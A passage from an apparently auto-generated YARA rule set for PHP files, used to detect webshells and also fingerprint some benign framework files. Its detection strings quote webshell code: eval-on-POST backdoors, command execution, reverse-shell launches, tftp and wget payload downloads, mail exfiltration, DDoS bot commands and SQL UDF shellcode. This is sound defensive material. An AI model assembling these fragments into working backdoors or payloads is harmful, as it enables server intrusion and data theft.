      $s19 = "if ($iwule39[$xhovg5][$r76[5] . $r76[54] . $r76[66] . $r76[78] . $r76[87] . $r76[41] . $r76[54] . $r76[94] . $r76[58] . $r76" fullword ascii
      $s20 = "if ($iwule39[$afses42][$r76[5] . $r76[54] . $r76[7] . $r76[90] . $r76[53] . $r76[5] . $r76[66] . $r76[78] . $r76[87] . $r76[" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_9780c70bd1c76425d4313ca7a9b89dda77d2c664
{
   meta:
      description = "php17 - file 9780c70bd1c76425d4313ca7a9b89dda77d2c664.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052e4b28141ad21d79acef4ec110354ca784596e0afa527923529db9fe9ac2b8"
   strings:
      $s1 = "//@eval($_POST['op']);" fullword ascii
      $s2 = "@eval($/*aaa*/{\"_P\".\"OST\"}['op']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AdminAuthenticator
{
   meta:
      description = "php17 - file AdminAuthenticator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ea2c83d11ee9b1aefca5ee6777a11cb1d29b0264d4f8471d2967b4c7daacbd0b"
   strings:
      $s1 = "if ($request->attributes->get('_route') === 'pimcore_admin_login_check') {" fullword ascii
      $s2 = "$this->dispatcher->dispatch(AdminEvents::LOGIN_CREDENTIALS, $event);" fullword ascii
      $s3 = "$event = new LoginFailedEvent($credentials);" fullword ascii
      $s4 = "if ($request->getMethod() === 'POST' && $password = $request->get('password')) {" fullword ascii
      $s5 = "use Pimcore\\Event\\Admin\\Login\\LoginCredentialsEvent;" fullword ascii
      $s6 = "$event = new LoginCredentialsEvent($request, $credentials);" fullword ascii
      $s7 = "public function getUser($credentials, UserProviderInterface $userProvider)" fullword ascii
      $s8 = "$pimcoreUser = Authentication::authenticatePlaintext($credentials['username'], $credentials['password']);" fullword ascii
      $s9 = "$response->headers->setCookie(new Cookie('pimcore_admin_sid', true, 0, '/', null, false, true));" fullword ascii
      $s10 = "$this->dispatcher->dispatch(AdminEvents::LOGIN_FAILED, $event);" fullword ascii
      $s11 = "$this->bruteforceProtectionHandler->addEntry($request->get('username'), $request);" fullword ascii
      $s12 = "class AdminAuthenticator extends AbstractGuardAuthenticator implements LoggerAwareInterface" fullword ascii
      $s13 = "use Pimcore\\Event\\Admin\\Login\\LoginFailedEvent;" fullword ascii
      $s14 = "// trigger LOGIN_FAILED event if user could not be authenticated via username/password" fullword ascii
      $s15 = "use Symfony\\Component\\HttpFoundation\\Session\\Attribute\\AttributeBagInterface;" fullword ascii
      $s16 = "// every request. therefore we only redirect if we're on the login page" fullword ascii
      $s17 = "* @param BruteforceProtectionHandler $bruteforceProtectionHandler" fullword ascii
      $s18 = "$url = $this->router->generate('pimcore_admin_login_deeplink');" fullword ascii
      $s19 = "if (isset($credentials['password'])) {" fullword ascii
      $s20 = "if (isset($credentials['user']) && $credentials['user'] instanceof UserModel) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_7c63796088d9db9f52d52dfd07a56349f25e81a0
{
   meta:
      description = "php17 - file 7c63796088d9db9f52d52dfd07a56349f25e81a0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "412e316949c3c138fd813ddb31f5fa15ded4999672480ad39ff0f9d54a8ffc1f"
   strings:
      $s1 = "echo \"<pre><font size=3 color=#FFF5EE>\" . shell_exec('ls -la') . \"</font></pre>\";" fullword ascii
      $s2 = "echo \"<pre><font size=3 color=#FFF5EE>\" . shell_exec($comd) . \"</font></pre>\";" fullword ascii
      $s3 = "echo \"<pre><font size=3 color=#FFF5EE>\" . shell_exec($cmd) . \"</font></pre>\";" fullword ascii
      $s4 = "echo '<form enctype=\"multipart/form-data\" action method=POST><font size=2 color=#FF0000><b>Upload File</b></font><br><input " fullword ascii
      $s5 = "mail(\"setoran404@gmail.com\", \"$body\", \"Hasil Bajakan http://$web$inj" fullword ascii
      $s6 = "$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);" fullword ascii
      $s7 = "move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name);" fullword ascii
      $s8 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name)) {" fullword ascii
      $s9 = "$db = file_get_contents(\"../configuration.php\");" fullword ascii
      $s10 = "$serper = gethostbyname($_SERVER['SERVER_ADDR']);" fullword ascii
      $s11 = "zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMnZ1bG5cMl06IGh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiIiLiRfU0VSVkVSWydSRVFVRVNUX1VSSSd" ascii
      $s12 = "BbktTQjhmQ0JrYVdVb0lsVnVhMjV2ZDI0Z1VISnZkRzlqYjJ4Y2JpSXBPdzBLYzI5amEyVjBLRk5GVWxaRlVpd2dVRVpmU1U1RlZDd2dVMDlEUzE5VFZGSkZRVTBzSUN" ascii
      $s13 = "OVVJFbE9MQ0krSmxORlVsWkZVaUlwT3cwS0lDQnZjR1Z1S0ZOVVJFOVZWQ3dpUGlaVFJWSldSVklpS1RzTkNpQWdiM0JsYmloVFZFUkZVbElzSWo0bVUwVlNWa1ZTSWl" ascii
      $s14 = "oJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJkb3dubG9hZFwyXTogTmFvIGZvaSBwb3NzaXZlbCBmYXplciBvIGRvd25sb2FkIGRlIFwyIi4kbWNtZFsxXS4iXDIiKTs" ascii
      $s15 = "OdmJtNWxZM1JjYmlJcE93MEtmUTBLY0hKcGJuUWdJbHNxWFNCVGNHRjNibWx1WnlCVGFHVnNiRnh1SWpzTkNtbG1JQ2doWm05eWF5Z2dLU2tnZXcwS0lDQnZjR1Z1S0Z" ascii
      $s16 = "oIW1haWwoJG1jbWRbMV0sIkluQm94IFRlc3QiLCJhZG1pbkBib2dlbC5jby4gc2luY2UgMjAxNVxuXG5pcDogJGMgXG5zb2Z0d2FyZTogJGIgXG5zeXN0ZW06ICRhIFx" ascii
      $s17 = "Sd2NtOTBieWtnZkh3Z1pHbGxJQ2dpVTI5amEyVjBJRVZ5Y205eVhHNGlLVHNOQ20xNUlDUjBZWEpuWlhRZ1BTQnBibVYwWDJGMGIyNG9KR2h2YzNRcE93MEthV1lnS0N" ascii
      $s18 = "CeWFXNTBaaUFpVlhOaFoyVTZJQ1F3SUZ0SWIzTjBYU0E4VUc5eWRENWNiaUk3RFFvZ0lHVjRhWFFvTVNrN0RRcDlEUXB3Y21sdWRDQWlXeXBkSUVSMWJYQnBibWNnUVh" ascii
      $s19 = "KbmRXMWxiblJ6WEc0aU93MEtKR2h2YzNRZ1BTQWtRVkpIVmxzd1hUc05DaVJ3YjNKMElEMGdPREE3RFFwcFppQW9KRUZTUjFaYk1WMHBJSHNOQ2lBZ0pIQnZjblFnUFN" ascii
      $s20 = "GamIyNXVaV04wS0ZORlVsWkZVaXdnY0dGamF5QWlVMjVCTkhnNElpd2dNaXdnSkhCdmNuUXNJQ1IwWVhKblpYUXBLU0I3RFFvZ0lHUnBaU2dpVlc1aFlteGxJSFJ2SUV" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 90KB and
      8 of them
}

rule ActivityAsset
{
   meta:
      description = "php17 - file ActivityAsset.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f39ccc9b7ea437a7ca1e18b3c6b6b1a38e27a4a11a160f37d422250bdd8cf7e8"
   strings:
      $s1 = "* @license https://www.humhub.com/licences" fullword ascii
      $s2 = "* @link https://www.humhub.org/" fullword ascii
      $s3 = "* @copyright Copyright (c) 2017 HumHub GmbH & Co. KG" fullword ascii
      $s4 = "public $sourcePath = '@activity/resources';" fullword ascii
      $s5 = "namespace humhub\\modules\\activity\\assets;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_90fe3f255b2ddae697cad4552843c1c1
{
   meta:
      description = "php17 - file 90fe3f255b2ddae697cad4552843c1c1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b44a151656686c3cf08bb90a8b6c78898d4157672e71e3be5298d23ff9a7b151"
   strings:
      $s1 = "echo \"IndoXploit - Auto Xploiter\";" fullword ascii
      $s2 = "echo \"<form method='post' enctype='multipart/form-data'>" fullword ascii
      $s3 = "<input type='file' name='idx'><input type='submit' name='upload' value='upload'>" fullword ascii
      $s4 = "if(@copy($_FILES['idx']['tmp_name'], $_FILES['idx']['name'])) {" fullword ascii
      $s5 = "if($_POST['upload']) {" fullword ascii
      $s6 = "echo \"<br>\".php_uname().\"<br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_49c50fe8a010c9849384328b5ca7738065be0a13
{
   meta:
      description = "php17 - file 49c50fe8a010c9849384328b5ca7738065be0a13.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1d4c1bc5afeca8d7755322dd900886f324e564d2969147bd90754438b63dab5f"
   strings:
      $x1 = "$res = execute(which('python').\" /tmp/angel_bcpy $yourip $yourport &\");" fullword ascii
      $x2 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $x3 = "p('<p><a href=\"http://www.4ngel.net/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x4 = "Copyright (C) 2004-2008 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $s5 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s6 = "r: 2008</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
      $s7 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:goaction('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s8 = "scookie('phpspypass', '', -86400 * 365);" fullword ascii
      $s9 = "function dbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {" fullword ascii
      $s10 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s11 = "return $data . $ctrldir . $this -> eof_ctrl_dir . pack('v', sizeof($this -> ctrl_dir)) . pack('v', sizeof($this -> ctrl_dir)) ." fullword ascii
      $s12 = "<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s13 = "$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');" fullword ascii
      $s14 = "dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s15 = "dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s16 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii
      $s17 = "makeinput(array('title'=>'Command','name'=>'command','value'=>$command));" fullword ascii
      $s18 = "scookie('phpspypass', $password);" fullword ascii
      $s19 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s20 = "<a href=\"javascript:goaction('logout');\">Logout</a> | " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule AMQPExceptionInterface
{
   meta:
      description = "php17 - file AMQPExceptionInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b13e128003fdec1e843f8e4a2548ea46cd9ad80d31e4cb6c74d83b6b73312d16"
   strings:
      $s1 = "* @package PHPDaemon\\Clients\\AMQP\\Driver\\Protocol\\Exception" fullword ascii
      $s2 = "* @author Aleksey I. Kuleshov YOU GLOBAL LIMITED" fullword ascii
      $s3 = "namespace PHPDaemon\\Clients\\AMQP\\Driver\\Protocol\\Exception;" fullword ascii
      $s4 = "* Interface AMQPException" fullword ascii
      $s5 = "interface AMQPExceptionInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule sig_7b27e2b0377a73cdee943e1b85fe1284e6cff980
{
   meta:
      description = "php17 - file 7b27e2b0377a73cdee943e1b85fe1284e6cff980.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6cd9a7dc15932809a39e8ed111a8d61f1152c58b104e947015d81e15c6cce89b"
   strings:
      $s1 = "for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode(\"%\".substr($t,$i,2)); //for" fullword ascii
      $s2 = "$t=$_POST[\"b\"]; //" fullword ascii
      $s3 = "$p=realpath(dirname(__FILE__).\"/../\").$_POST[\"a\"]; //" fullword ascii
      $s4 = "+$_POST[\"a\"]" fullword ascii
      $s5 = "$_POST[\"b\"]" fullword ascii
      $s6 = "@fwrite(fopen($p,\"w\"),$tt); //" fullword ascii
   condition:
      uint16(0) == 0x2020 and filesize < 1KB and
      all of them
}

rule sig_339f32c883f6175233f0d1a30510caa52fdcaa37
{
   meta:
      description = "php17 - file 339f32c883f6175233f0d1a30510caa52fdcaa37.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c74ab642da22fdde68b9444a3a214cd7f56b8f54ca2015154a4cc356deba0aca"
   strings:
      $s1 = "<?php=`$_GET[1]`;?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_249cebbea6c7578d8551c89e40fca70edb01c579
{
   meta:
      description = "php17 - file 249cebbea6c7578d8551c89e40fca70edb01c579.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b492336ac5907684c1b922e1c25c113ffc303ffbef645b4e95d36bc50e932033"
   strings:
      $s1 = ";$x($_POST['root']); ?>" fullword ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 1KB and
      all of them
}

rule sig_140748a2a279ced57c797f726dcb7ad9a65005e2
{
   meta:
      description = "php17 - file 140748a2a279ced57c797f726dcb7ad9a65005e2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c929f266350e6b936ad98409beb09d99a46c174440b2cc294b1b6440b5dea350"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x18 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $x19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $x20 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule AbstractOperator
{
   meta:
      description = "php17 - file AbstractOperator.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "42f1b8f532092b904bdb34216b3149038de940dcdc58c5434a1c9c9220f26966"
   strings:
      $s1 = "namespace Pimcore\\DataObject\\Import\\ColumnConfig\\Operator;" fullword ascii
      $s2 = "* @return ConfigElementInterface[]" fullword ascii
      $s3 = "* @var ConfigElementInterface[]" fullword ascii
      $s4 = "abstract class AbstractOperator extends AbstractConfigElement implements OperatorInterface" fullword ascii
      $s5 = "use Pimcore\\DataObject\\Import\\ColumnConfig\\AbstractConfigElement;" fullword ascii
      $s6 = "use Pimcore\\DataObject\\Import\\ColumnConfig\\ConfigElementInterface;" fullword ascii
      $s7 = "public function getChilds(): array" fullword ascii
      $s8 = "parent::__construct($config, $context);" fullword ascii
      $s9 = "$this->childs = $config->childs;" fullword ascii
      $s10 = "public function __construct(\\stdClass $config, $context = null)" fullword ascii
      $s11 = "if (is_array($config->childs)) {" fullword ascii
      $s12 = "* @package    Object" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule __generalMultiple_v1_public
{
   meta:
      description = "php17 - file __generalMultiple.v1.public.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "545d8772a486e39db300b84d161bb38f7ddad0f337e380eba7dcba36a88f500a"
   strings:
      $s1 = "* @apiSuccessExample {json} Success-Response:" fullword ascii
      $s2 = "* @apiDefine GeneralSuccessMultipleResponse" fullword ascii
      $s3 = "// same object structure of the single response" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ActivationRepositoryInterface
{
   meta:
      description = "php17 - file ActivationRepositoryInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7e3c3c3ef83a842b4ec9b552673179c15d106859389082b70903e76ae4fb2416"
   strings:
      $s1 = "* @param  \\Cartalyst\\Sentinel\\Users\\UserInterface  $user" fullword ascii
      $s2 = "* Completes the activation for the given user." fullword ascii
      $s3 = "* @link       http://cartalyst.com" fullword ascii
      $s4 = "* Checks if a valid activation for the given user exists." fullword ascii
      $s5 = "* Checks if a valid activation has been completed." fullword ascii
      $s6 = "* This source file is subject to the 3-clause BSD License that is" fullword ascii
      $s7 = "* bundled with this package in the LICENSE file." fullword ascii
      $s8 = "* Licensed under the 3-clause BSD License." fullword ascii
      $s9 = "* Remove an existing activation (deactivate)." fullword ascii
      $s10 = "* Create a new activation record and code." fullword ascii
      $s11 = "* @return \\Cartalyst\\Sentinel\\Activations\\ActivationInterface" fullword ascii
      $s12 = "* @return \\Cartalyst\\Sentinel\\Activations\\ActivationInterface|bool" fullword ascii
      $s13 = "public function complete(UserInterface $user, $code);" fullword ascii
      $s14 = "use Cartalyst\\Sentinel\\Users\\UserInterface;" fullword ascii
      $s15 = "* Remove expired activation codes." fullword ascii
      $s16 = "* @copyright  (c) 2011-2017, Cartalyst LLC" fullword ascii
      $s17 = "public function completed(UserInterface $user);" fullword ascii
      $s18 = "* Part of the Sentinel package." fullword ascii
      $s19 = "public function exists(UserInterface $user, $code = null);" fullword ascii
      $s20 = "* @param  string  $code" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_3c6b496a8ef29509d3325690f2db9d5119653272
{
   meta:
      description = "php17 - file 3c6b496a8ef29509d3325690f2db9d5119653272.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ca6284d5af5bd5095225d45084fe9626a7ac078ad2f4cc4020d6f86e5daad0d1"
   strings:
      $x1 = "$res=$api->WinExec(\"cmd.exe /c $command >\\\"$name\\\"\",0);" fullword ascii
      $x2 = "$exec=$ws->exec(\"cmd.exe /c $command\"); " fullword ascii
      $x3 = "win_shell_execute('cmd.exe','',\"/C $command >\\\"$name\\\"\");" fullword ascii
      $x4 = "$cmd=(empty($_SERVER['ComSpec']))?'d:\\\\windows\\\\system32\\\\cmd.exe':$_SERVER['ComSpec'];" fullword ascii
      $x5 = "Exe('wget http://www.syrian-shell.com/usersAndDomains/users.rar');" fullword ascii
      $x6 = "if(function_exists('passthru')){ob_start();@passthru($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}" fullword ascii
      $x7 = "[</span><a href=http://www.yougetsignal.com/tools/web-sites-on-web-server target=\\\"_blank\\\"/>Reverse IP</a>]</span>" fullword ascii
      $x8 = "header(\"Content-Disposition: attachment; filename=\\\"dump_{$db_dump}.sql\".($archive=='none'?'':'.gz').\"\\\"\\n\\n\");" fullword ascii
      $x9 = "else if($_POST['submitCommands']) // Execute The Alias Command ." fullword ascii
      $x10 = "fputs($verbinden,\"privmsg $Channel :tcp-ddos - flood $read2[4]:$read2[5] with $read2[6] sockets.\\n\\n\");" fullword ascii
      $x11 = "else if($_POST['Execute']) // Execute The Command From Command Line  ." fullword ascii
      $x12 = "$api=new ffi(\"[lib='kernel32.dll'] int WinExec(char *APP,int SW);\");" fullword ascii
      $x13 = "<sy>Inject Shell In FAQ.php ? <input type='checkbox' name='injectFAQ'> [ VB Only ]</sy><br />" fullword ascii
      $x14 = "print \"Error : Connection Timeout Please Check The Target Hostname .\";" fullword ascii
      $x15 = "name='submitCommands' type='submit' value='ExecuteCommand'></td></tr></table></form>" fullword ascii
      $x16 = "print \"[-] Connection Timeout Please Check The Target Hostname .\";" fullword ascii
      $x17 = "elseif(function_exists('popen')){$output=@popen($command,'r');while(!feof($output)){$exec=fgets($output);}pclose($output);}" fullword ascii
      $x18 = "Exe('wget http://www.syrian-shell.com/cgiPerl/cgiPerl.sy3.zip');" fullword ascii
      $x19 = "elseif(function_exists('win32_create_service'))$exec=srvshelL($command);" fullword ascii
      $x20 = "fputs($verbinden,\"privmsg $Channel :ddos-http - http://$read2[4]:$read2[5] $read2[6] times\\n\\n\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule AppendEventInterface
{
   meta:
      description = "php17 - file AppendEventInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "192184f46895fc7773f22020c830947e699fa3c5a7a664acd488ce6c020b3d62"
   strings:
      $s1 = "interface AppendEventInterface extends EventInterface" fullword ascii
      $s2 = "use Hifone\\Events\\EventInterface;" fullword ascii
      $s3 = "namespace Hifone\\Events\\Append;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_9155c9e5f24680be81e8ec0d4dcb9cafb6982cc3
{
   meta:
      description = "php17 - file 9155c9e5f24680be81e8ec0d4dcb9cafb6982cc3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "29d87ac59ba5429d493cd0960ffdfcab05f6cfdc3afa7745f7b24fd9e21dcbe6"
   strings:
      $s1 = "header(\"content-Type: text/html; charset=gb2312\");" fullword ascii
      $s2 = "<form id=\"form1\" name=\"form1\" method=\"get\" action=\"\">" fullword ascii
      $s3 = "if(is_writable($dir.\"/\".$file)&&is_readable($dir.\"/\".$file))" fullword ascii
      $s4 = "<div align=\"center\">code Author:<span class=\"STYLE1\"><font color='red'> " fullword ascii
      $s5 = "while (($file= readdir($dh)) !== false){" fullword ascii
      $s6 = "if(isset($_GET['dir']))" fullword ascii
      $s7 = "listDir($_GET['dir']);" fullword ascii
      $s8 = "<input name=\"dir\" type=\"text\" value=\"c:/\" />" fullword ascii
      $s9 = "</font></b>\".$dir.$file.\"<font color='red'> " fullword ascii
      $s10 = "<input type=\"submit\" name=\"Submit\" value=\"" fullword ascii
      $s11 = "if(is_writable($dir.\"/\".$file))" fullword ascii
      $s12 = "listDir($dir.\"/\".$file.\"/\");" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 3KB and
      8 of them
}

rule a5ba719d22ba09dd6581a8e81170f0cda778a3a9
{
   meta:
      description = "php17 - file a5ba719d22ba09dd6581a8e81170f0cda778a3a9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "593c6d00212d6044dbc29036c6e59e8875b1280c63745a06580de3cc42e9e16c"
   strings:
      $x1 = "53617400467269005468750057656400547565004D6F6E0053756E00434F4E4F5554240053756E4D6F6E547565576564546875467269536174" ascii
      $x2 = "$query=\"INSERT into Temp_udf values (CONVERT($shellcode,CHAR));\";" fullword ascii
      $s3 = "0047657450726F6365737357696E646F7753746174696F6E00476574557365724F626A656374496E666F726D6174696F6E41" ascii
      $s4 = "$s=\"SELECT unhex(cmd) FROM diy_dll INTO DUMPFILE '$diypath'\";" fullword ascii
      $s5 = "00466C734672656500466C7353657456616C756500466C7347657456616C756500466C73416C6C6F63" ascii
      $s6 = "00200020002000200020002000200020002000200020002000200020002000200020002000200020" ascii
      $s7 = "0000004B00450052004E0045004C00330032002E0044004C004C000000000044" ascii
      $s8 = "$query=\"SELECT udf FROM Temp_udf INTO DUMPFILE '\".$path.\"';\" ;" fullword ascii
      $s9 = "4D6963726F736F66742056697375616C20432B2B2052756E74696D65204C696272617279" ascii
      $s10 = "4A616E4665624D61724170724D61794A756E4A756C4175675365704F63744E6F76446563" ascii
      $s11 = "004A616E4665624D61724170724D61794A756E4A756C4175675365704F63744E6F76446563" ascii
      $s12 = "646464642C204D4D4D4D2064642C2079797979004D4D2F64642F7979" ascii
      $s13 = "456E746572437269746963616C53656374696F6E" ascii
      $s14 = "echo '<option value=\"create function msx returns string soname \\'msxtest.dll\\'\">" fullword ascii
      $s15 = "0000000000000028006E0075006C006C0029000000000028" ascii
      $s16 = "4142434445464748494A4B4C4D4E4F505152535455565758595A" ascii
      $s17 = "657320612062756720696E20796F7572206170706C69636174696F6E2E204974206973206D6F7374206C696B656C792074686520726573756C74206F66206361" ascii
      $s18 = "6C6C696E6720616E204D53494C2D636F6D70696C656420282F636C72292066756E6374696F6E2066726F6D2061206E617469766520636F6E7374727563746F72" ascii
      $s19 = "69636174696F6E2068617320726571756573746564207468652052756E74696D6520746F207465726D696E61746520697420696E20616E20756E757375616C20" ascii
      $s20 = "0047657450726F6365737357696E646F7753746174696F6E00476574557365724F626A656374496E666F726D6174696F6E410000004765744C61737441637469" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_05546b0e38ab9175cd905eebcc6ebb76
{
   meta:
      description = "php17 - file 05546b0e38ab9175cd905eebcc6ebb76.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e7eeba3b5fef6c4fb2bf4aa664ce87f13d5b15f288d4c1471c5c872d67ae87d8"
   strings:
      $s1 = "$f = \"<a href=\\\"$self?symlinktarget=\" . urlencode($dir . $file['filename']). \"$p\\\">{$words['createsymlink']}</a> | \";;" fullword ascii
      $s2 = "$words['symlink'] = 'Symbolick&#xFD; odkaz'; $words['createsymlink'] = 'vytvo&#x0159;it odkaz'; $words['target'] = 'C&#xED;l';" fullword ascii
      $s3 = "trlen($_GET['symlinktarget']) + 9; if ($size < 30) $size = 30; echo($size);  ?>\"></td>" fullword ascii
      $s4 = "if (isset($_POST['add']) && !empty($_POST['username']) && !empty($_POST['password'])) {" fullword ascii
      $s5 = "$words['username'] = 'U&#x017E;ivatelsk&#xE9; jm&#xE9;no'; $words['password'] = 'Heslo'; $words['add'] = 'p&#x0159;idat';" fullword ascii
      $s6 = "$words['symlink'] = 'Link simbolico'; $words['createsymlink'] = 'crea symlink'; $words['target'] = 'Target';" fullword ascii
      $s7 = "if (((int) $z) > 0 && ((int) $z) <= count($repl) && $prevz == ' ') $newstr .= $repl[((int) $z) - 1]; else $newstr .= $z;" fullword ascii
      $s8 = "$words['symlink'] = 'Symbolischer Link'; $words['createsymlink'] = 'Link erstellen'; $words['target'] = 'Ziel';" fullword ascii
      $s9 = "<input type=\"hidden\" name=\"symlinktarget\" value=\"<?php echo(htmlentities($_GET['symlinktarget'])); ?>\">" fullword ascii
      $s10 = "pnotice(\"<a href=\\\"$self?action=treeon&\" . SID . '\" target=\"_top\">' . $words['treeon'] . '</a>');" fullword ascii
      $s11 = "$words['symlink'] = 'Symbolic link'; $words['createsymlink'] = 'create link'; $words['target'] = 'Target';" fullword ascii
      $s12 = "pnotice(\"<a href=\\\"$self?action=treeoff&\" . SID . '\" target=\"_top\">' . $words['treeoff'] . '</a>');" fullword ascii
      $s13 = "echo(\"\\n\" . htmlentities($_POST['username'] . ':' . crypt($_POST['password'])));" fullword ascii
      $s14 = "$f .= \"<a href=\\\"$self?edit=\" . urlencode($file['fullfilename']) . '.htaccess' . \"$p\\\">{$words['configure']}</a> | \";" fullword ascii
